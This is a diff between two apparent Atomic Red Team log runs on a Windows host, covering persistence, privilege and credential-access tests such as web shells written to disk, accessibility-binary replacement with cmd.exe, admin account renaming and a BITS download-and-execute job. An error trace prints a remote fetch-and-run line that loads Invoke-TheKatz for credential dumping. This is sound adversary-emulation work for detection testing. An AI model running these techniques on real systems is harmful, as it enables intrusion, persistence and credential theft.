@@ -162,6 +162,8 @@ END T1053.005 Test 11
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing cleanup for test: T1053.005-11 Scheduled Task Persistence via CompMgmt.msc
+The operation completed successfully.
+SUCCESS: The scheduled task "CompMgmtBypass" was successfully deleted.
 Done executing cleanup for test: T1053.005-11 Scheduled Task Persistence via CompMgmt.msc
 
 
@@ -279,7 +281,6 @@ END T1547 Test 3
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing cleanup for test: T1547-3 Leverage Virtual Channels to execute custom DLL during successful RDP session
-The operation completed successfully.
 Done executing cleanup for test: T1547-3 Leverage Virtual Channels to execute custom DLL during successful RDP session
 
 
@@ -351,7 +352,7 @@ SERVICE_NAME: AtomicTestService_CMD
         SERVICE_EXIT_CODE  : 0  (0x0)
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x7d0
-        PID                : 2900
+        PID                : 6304
         FLAGS              :
 Exit code: 0
 Done executing test: T1543.003-2 Service Installation CMD
@@ -408,7 +409,7 @@ SERVICE_NAME: W64Time
         SERVICE_EXIT_CODE  : 0  (0x0)
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x7d0
-        PID                : 6244
+        PID                : 6700
         FLAGS              :
 Exit code: 0
 Done executing test: T1543.003-4 TinyTurla backdoor service w64time
@@ -437,7 +438,7 @@ SERVICE_NAME: AtomicTestService_CMD
         SERVICE_EXIT_CODE  : 0  (0x0)
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x7d0
-        PID                : 7596
+        PID                : 9448
         FLAGS              :
 Exit code: 0
 Done executing test: T1543.003-5 Remote Service Installation CMD
@@ -512,11 +513,75 @@ The Print Spooler service was started successfully.
 Done executing cleanup for test: T1547.012-1 Print Processors
 
 
-[TIMEOUT] 2026-08-05T16:19:36.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
-[TIMEOUT] 2026-08-05T16:21:37.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
-[TIMEOUT] 2026-08-05T16:23:37.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
-[TIMEOUT] 2026-08-05T16:25:37.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
-[TIMEOUT] 2026-08-05T16:27:37.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
+START T1137.006 Test 1
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing test: T1137.006-1 Code Executed Via Excel Add-in File (XLL)
+64-bit Office
+True
+Exit code: 0
+Done executing test: T1137.006-1 Code Executed Via Excel Add-in File (XLL)
+END T1137.006 Test 1
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing cleanup for test: T1137.006-1 Code Executed Via Excel Add-in File (XLL)
+Done executing cleanup for test: T1137.006-1 Code Executed Via Excel Add-in File (XLL)
+
+
+START T1137.006 Test 2
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing test: T1137.006-2 Persistent Code Execution Via Excel Add-in File (XLL)
+64-bit Office
+Exit code: 0
+Done executing test: T1137.006-2 Persistent Code Execution Via Excel Add-in File (XLL)
+END T1137.006 Test 2
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing cleanup for test: T1137.006-2 Persistent Code Execution Via Excel Add-in File (XLL)
+Done executing cleanup for test: T1137.006-2 Persistent Code Execution Via Excel Add-in File (XLL)
+
+
+START T1137.006 Test 3
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing test: T1137.006-3 Persistent Code Execution Via Word Add-in File (WLL)
+64-bit Office
+Exit code: 0
+Done executing test: T1137.006-3 Persistent Code Execution Via Word Add-in File (WLL)
+END T1137.006 Test 3
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing cleanup for test: T1137.006-3 Persistent Code Execution Via Word Add-in File (WLL)
+Done executing cleanup for test: T1137.006-3 Persistent Code Execution Via Word Add-in File (WLL)
+
+
+START T1137.006 Test 4
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing test: T1137.006-4 Persistent Code Execution Via Excel VBA Add-in File (XLAM)
+Exit code: 0
+Done executing test: T1137.006-4 Persistent Code Execution Via Excel VBA Add-in File (XLAM)
+END T1137.006 Test 4
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing cleanup for test: T1137.006-4 Persistent Code Execution Via Excel VBA Add-in File (XLAM)
+Done executing cleanup for test: T1137.006-4 Persistent Code Execution Via Excel VBA Add-in File (XLAM)
+
+
+START T1137.006 Test 5
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing test: T1137.006-5 Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
+Exit code: 0
+Done executing test: T1137.006-5 Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
+END T1137.006 Test 5
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing cleanup for test: T1137.006-5 Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
+Done executing cleanup for test: T1137.006-5 Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
+
+
 START T1505.002 Test 1
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
@@ -590,9 +655,9 @@ START T1176 Test 4
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing test: T1176-4 Google Chrome Load Unpacked Extension With Command Line
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
 -------  ------    -----      -----     ------     --  -- -----------                                                  
-      0       2      572       2072       0.00   6616   0 chrome                                                       
-Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+      0       2      576       2080       0.02   1860   0 chrome
 Exit code: 0
 Done executing test: T1176-4 Google Chrome Load Unpacked Extension With Command Line
 END T1176 Test 4
@@ -600,7 +665,6 @@ PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing cleanup for test: T1176-4 Google Chrome Load Unpacked Extension With Command Line
 Remove-Item : Cannot remove item C:\Users\huy\AppData\Local\Temp\chrome-win\locales\en-GB.pak: Access to the path 
-'en-GB.pak' is denied.
 At line:3 char:1
 + Remove-Item .\chrome.zip, .\chrome-win, .\extension, .\extension.zip  ...
 + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -612,6 +676,7 @@ At line:3 char:1
 + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : WriteError: (locales:DirectoryInfo) [Remove-Item], IOException
     + FullyQualifiedErrorId : RemoveFileSystemItemIOError,Microsoft.PowerShell.Commands.RemoveItemCommand
+'en-GB.pak' is denied.
 Remove-Item : Cannot remove item C:\Users\huy\AppData\Local\Temp\chrome-win\chrome.dll: Access to the path 
 'chrome.dll' is denied.
 At line:3 char:1
@@ -944,8 +1009,8 @@ Executing test: T1112-6 Javascript in registry
 T1112        : <script>
 PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet
                 Settings
-PSChildName  : Internet Settings
 PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion
+PSChildName  : Internet Settings
 PSDrive      : HKCU
 PSProvider   : Microsoft.PowerShell.Core\Registry
 Exit code: 0
@@ -1497,8 +1562,8 @@ PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing test: T1112-42 Terminal Server Client Connection History Cleared
 The operation completed successfully.
-The operation completed successfully.
-Exit code: 0
+ERROR: The system was unable to find the specified registry key or value.
+Exit code: 1
 Done executing test: T1112-42 Terminal Server Client Connection History Cleared
 END T1112 Test 42
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
@@ -1897,7 +1962,7 @@ The operation completed successfully.
 Done executing cleanup for test: T1112-68 Set-Up Proxy Server
 
 
-[TIMEOUT] 2026-08-05T17:09:45.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
+[TIMEOUT] 2026-08-09T17:26:29.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
 START T1112 Test 70
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
@@ -1947,6 +2012,7 @@ Invoke-CimMethod : Cannot bind argument to parameter 'CimSession' because it is 
 +                                                                       ~~
     + CategoryInfo          : InvalidData: (:) [Invoke-CimMethod], ParameterBindingValidationException
     + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.Management.Infrastructure.CimCm 
+ 
 At line:1 char:213
    dlets.InvokeCimMethodCommand
 Done executing cleanup for test: T1112-72 Setting Shadow key in Registry for RDP Shadowing
@@ -2228,8 +2294,8 @@ PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 Executing test: T1505.003-1 Web Shell Written to Disk
 C:\AtomicRedTeam\atomics\T1505.003\src\b.jsp
 C:\AtomicRedTeam\atomics\T1505.003\src\cmd.aspx
-3 File(s) copied
 C:\AtomicRedTeam\atomics\T1505.003\src\tests.jsp
+3 File(s) copied
 Exit code: 0
 Done executing test: T1505.003-1 Web Shell Written to Disk
 END T1505.003 Test 1
@@ -2351,9 +2417,9 @@ User's comment
 Country/region code          000 (System Default)
 Account active               Yes
 Account expires              Never
-Password last set            06/08/2026 00:25:17
+Password last set            10/08/2026 00:42:23
 Password expires             Never
-Password changeable          06/08/2026 00:25:17
+Password changeable          10/08/2026 00:42:23
 Password required            Yes
 User may change password     No
 Workstations allowed         All
@@ -2401,7 +2467,7 @@ Executing cleanup for test: T1547.004-2 Winlogon Userinit Key Persistence - Powe
 Done executing cleanup for test: T1547.004-2 Winlogon Userinit Key Persistence - PowerShell
 
 
-[TIMEOUT] 2026-08-05T17:26:13.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
+[TIMEOUT] 2026-08-09T17:43:25.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
 START T1547.004 Test 4
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
@@ -2601,6 +2667,19 @@ END T1546.008 Test 3
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing cleanup for test: T1546.008-3 Create Symbolic Link From osk.exe to cmd.exe
+Successfully processed 0 files; Failed processing 0 files
+The system cannot find the file specified.
+Successfully processed 0 files; Failed processing 1 files
+Successfully processed 0 files; Failed processing 1 files
+Successfully processed 0 files; Failed processing 0 files
+Successfully processed 0 files; Failed processing 1 files
+Successfully processed 0 files; Failed processing 1 files
+ERROR: The system cannot find the file specified.
+Could Not Find C:\Windows\System32\osk.exe
+C:\Windows\system32\osk.exe: The system cannot find the file specified.
+C:\Windows\system32\osk.exe: The system cannot find the file specified.
+C:\Windows\system32\osk.exe: The system cannot find the file specified.
+C:\Windows\system32\osk.exe: The system cannot find the file specified.
 Done executing cleanup for test: T1546.008-3 Create Symbolic Link From osk.exe to cmd.exe
 
 
@@ -2676,9 +2755,9 @@ PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing test: T1546.008-8 Replace Narrator.exe (Narrator binary) with cmd.exe
 SUCCESS: The file (or folder): "C:\Windows\System32\Narrator.exe" now owned by the administrators group.
-processed file: C:\Windows\System32\Narrator.exe
 Successfully processed 1 files; Failed processing 0 files
         1 file(s) copied.
+processed file: C:\Windows\System32\Narrator.exe
 Exit code: 0
 Done executing test: T1546.008-8 Replace Narrator.exe (Narrator binary) with cmd.exe
 END T1546.008 Test 8
@@ -2952,43 +3031,11 @@ At line:3 char:1
 Done executing cleanup for test: T1546.009-1 Create registry persistence via AppCert DLL
 
 
-START T1546.003 Test 1
-PathToAtomicsFolder = C:\AtomicRedTeam\atomics
-
-Executing test: T1546.003-1 Persistence via WMI Event Subscription - CommandLineEventConsumer
-Exit code: 0
-Done executing test: T1546.003-1 Persistence via WMI Event Subscription - CommandLineEventConsumer
-END T1546.003 Test 1
-PathToAtomicsFolder = C:\AtomicRedTeam\atomics
-
-Executing cleanup for test: T1546.003-1 Persistence via WMI Event Subscription - CommandLineEventConsumer
-Done executing cleanup for test: T1546.003-1 Persistence via WMI Event Subscription - CommandLineEventConsumer
-
-
+[TIMEOUT] 2026-08-09T17:51:01.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
 START T1546.003 Test 2
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing test: T1546.003-2 Persistence via WMI Event Subscription - ActiveScriptEventConsumer
-Set-WmiInstance : Object or property already exists 
-At line:5 char:9
-+ $Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscri ...
-+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : InvalidOperation: (:) [Set-WmiInstance], ManagementException
-    + FullyQualifiedErrorId : SetWMIManagementException,Microsoft.PowerShell.Commands.SetWmiInstance
- 
-Set-WmiInstance : Object or property already exists 
-At line:13 char:11
-+ $Consumer=Set-WmiInstance -Namespace "root\subscription" -Class Activ ...
-+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : InvalidOperation: (:) [Set-WmiInstance], ManagementException
-    + FullyQualifiedErrorId : SetWMIManagementException,Microsoft.PowerShell.Commands.SetWmiInstance
- 
-Set-WmiInstance : Invalid property 
-At line:19 char:28
-+ ... erBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__ ...
-+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : InvalidOperation: (:) [Set-WmiInstance], ManagementException
-    + FullyQualifiedErrorId : SetWMIManagementException,Microsoft.PowerShell.Commands.SetWmiInstance
 Exit code: 0
 Done executing test: T1546.003-2 Persistence via WMI Event Subscription - ActiveScriptEventConsumer
 END T1546.003 Test 2
@@ -3096,7 +3143,7 @@ Executing cleanup for test: T1547.001-5 Suspicious jse file run from startup Fol
 Done executing cleanup for test: T1547.001-5 Suspicious jse file run from startup Folder
 
 
-[TIMEOUT] 2026-08-05T17:35:47.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
+[TIMEOUT] 2026-08-09T17:55:34.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
 START T1547.001 Test 7
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
@@ -3145,7 +3192,7 @@ Executing test: T1547.001-10 Change Startup Folder - HKLM Modify User Shell Fold
 Directory: C:\Users\huy\AppData\Local\Temp
 Mode                 LastWriteTime         Length Name                                                                 
 ----                 -------------         ------ ----                                                                 
-d-----        06/08/2026     00:39                atomictest
+d-----        10/08/2026     00:58                atomictest
 Exit code: 0
 Done executing test: T1547.001-10 Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
 END T1547.001 Test 10
@@ -3162,7 +3209,7 @@ Executing test: T1547.001-11 Change Startup Folder - HKCU Modify User Shell Fold
 Directory: C:\Users\huy\AppData\Local\Temp
 Mode                 LastWriteTime         Length Name                                                                 
 ----                 -------------         ------ ----                                                                 
-d-----        06/08/2026     00:39                atomictest
+d-----        10/08/2026     00:59                atomictest
 Exit code: 0
 Done executing test: T1547.001-11 Change Startup Folder - HKCU Modify User Shell Folders Startup Value
 END T1547.001 Test 11
@@ -3333,7 +3380,7 @@ START T1098 Test 1
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing test: T1098-1 Admin Account Manipulate
-HaHa_347114075136
+HaHa_164089093371
 Successfully Renamed Administrator Account on  DESKTOP-45P9U1F
 Exit code: 0
 Done executing test: T1098-1 Admin Account Manipulate
@@ -3342,7 +3389,7 @@ PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing cleanup for test: T1098-1 Admin Account Manipulate
 True
-Successfully Reverted Account HaHa_347114075136 to Administrator on  DESKTOP-45P9U1F
+Successfully Reverted Account HaHa_164089093371 to Administrator on  DESKTOP-45P9U1F
 Done executing cleanup for test: T1098-1 Admin Account Manipulate
 
 
@@ -3373,11 +3420,12 @@ PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing cleanup for test: T1098-2 Domain Account and Group Manipulate
 Get-ADUser : Unable to find a default server with Active Directory Web Services running.
-At line:1 char:4
 + & {Get-ADUser -LDAPFilter "(&(samaccountname=atr--*)(givenName=Test)) ...
 +    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : ResourceUnavailable: (:) [Get-ADUser], ADServerDownException
     + FullyQualifiedErrorId : ActiveDirectoryServer:1355,Microsoft.ActiveDirectory.Management.Commands.GetADUser
+ 
+At line:1 char:4
 Done executing cleanup for test: T1098-2 Domain Account and Group Manipulate
 
 
@@ -3444,10 +3492,10 @@ be loaded. For more information, run 'Import-Module Microsoft.PowerShell.Securit
 Error code:
 ConvertTo-SecureString : The 'ConvertTo-SecureString' command was found in the module 'Microsoft.PowerShell.Security', 
 but the module could not be loaded. For more information, run 'Import-Module Microsoft.PowerShell.Security'.
+At line:3 char:127
 + ... tList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
 +                                                   ~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : ObjectNotFound: (ConvertTo-SecureString:String) [], CommandNotFoundException
-At line:3 char:127
     + FullyQualifiedErrorId : CouldNotAutoloadMatchingModule
  
 You cannot call a method on a null-valued expression.
@@ -3562,8 +3610,8 @@ Executing test: T1098-15 Domain Password Policy Check: Only Two Character Classe
 The 'ConvertTo-SecureString' command was found in the module 'Microsoft.PowerShell.Security', but the module could not 
 be loaded. For more information, run 'Import-Module Microsoft.PowerShell.Security'.
 Error code:
-but the module could not be loaded. For more information, run 'Import-Module Microsoft.PowerShell.Security'.
 ConvertTo-SecureString : The 'ConvertTo-SecureString' command was found in the module 'Microsoft.PowerShell.Security', 
+but the module could not be loaded. For more information, run 'Import-Module Microsoft.PowerShell.Security'.
 At line:3 char:127
 + ... tList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
 +                                                   ~~~~~~~~~~~~~~~~~~~~~~
@@ -3670,19 +3718,19 @@ START T1546 Test 4
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing test: T1546-4 WMI Invoke-CimMethod Start Process
-Process started successfully with Process ID: 3660
+Process started successfully with Process ID: 2576
 ConvertTo-SecureString : The 'ConvertTo-SecureString' command was found in the module 'Microsoft.PowerShell.Security', 
 but the module could not be loaded. For more information, run 'Import-Module Microsoft.PowerShell.Security'.
 At line:3 char:11
-+  $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Fo ...
 +           ~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : ObjectNotFound: (ConvertTo-SecureString:String) [], CommandNotFoundException
++  $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Fo ...
     + FullyQualifiedErrorId : CouldNotAutoloadMatchingModule
  
 New-Object : Exception calling ".ctor" with "2" argument(s): "Cannot process argument because the value of argument 
 "password" is null. Change the value of argument "password" to a non-null value."
-At line:4 char:16
 + ... redential = New-Object -TypeName System.Management.Automation.PSCrede ...
+At line:4 char:16
 +                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand
@@ -3741,6 +3789,12 @@ START T1546 Test 8
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
 Executing test: T1546-8 Persistence via ErrorHandler.cmd script execution
+Copy-Item : Could not find a part of the path 'C:\Windows\Setup\Scripts\ErrorHandler.cmd'.
+At line:1 char:4
++ & {Copy-Item -Path C:\AtomicRedTeam\atomics\T1546\src\ErrorHandler.cm ...
++    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Copy-Item], DirectoryNotFoundException
+    + FullyQualifiedErrorId : System.IO.DirectoryNotFoundException,Microsoft.PowerShell.Commands.CopyItemCommand
 Exit code: 0
 Done executing test: T1546-8 Persistence via ErrorHandler.cmd script execution
 END T1546 Test 8
@@ -3957,7 +4011,7 @@ Executing test: T1197-3 Persist, Download, & Execute
 BITSADMIN version 3.0
 BITS administration utility.
 (C) Copyright Microsoft Corp.
-Created job {05FCAAB7-1B07-4363-91D0-78736C7643C5}.
+Created job {1921D076-6F37-49D8-9CF2-DB121A858A63}.
 BITSADMIN version 3.0
 BITS administration utility.
 (C) Copyright Microsoft Corp.
@@ -4034,7 +4088,21 @@ The operation completed successfully.
 Done executing cleanup for test: T1546.002-1 Set Arbitrary Binary as Screensaver
 
 
-[TIMEOUT] 2026-08-05T17:52:40.000Z Command '['pwsh', '-File', 'scripts/run_atomic.ps1', '-JsonFile', 'output/current_round.json']' timed out after 120 seconds
+START T1137.002 Test 1
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing test: T1137.002-1 Office Application Startup Test Persistence (HKCU)
+64-bit Office
+The operation completed successfully.
+Exit code: 0
+Done executing test: T1137.002-1 Office Application Startup Test Persistence (HKCU)
+END T1137.002 Test 1
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+
+Executing cleanup for test: T1137.002-1 Office Application Startup Test Persistence (HKCU)
+Done executing cleanup for test: T1137.002-1 Office Application Startup Test Persistence (HKCU)
+
+
 START T1053.002 Test 1
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
@@ -4127,13 +4195,13 @@ Exception calling "DownloadString" with "1" argument(s): "Could not find a part 
 At line:861 char:5
 +     IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_rep ...
 +     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
     + FullyQualifiedErrorId : WebException
  
 Invoke-TheKatz : The term 'Invoke-TheKatz' is not recognized as the name of a cmdlet, function, script file, or 
 operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
 again.
 At line:867 char:11
-    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
 +     }else{Invoke-TheKatz}
 +           ~~~~~~~~~~~~~~
     + CategoryInfo          : ObjectNotFound: (Invoke-TheKatz:String) [], CommandNotFoundException
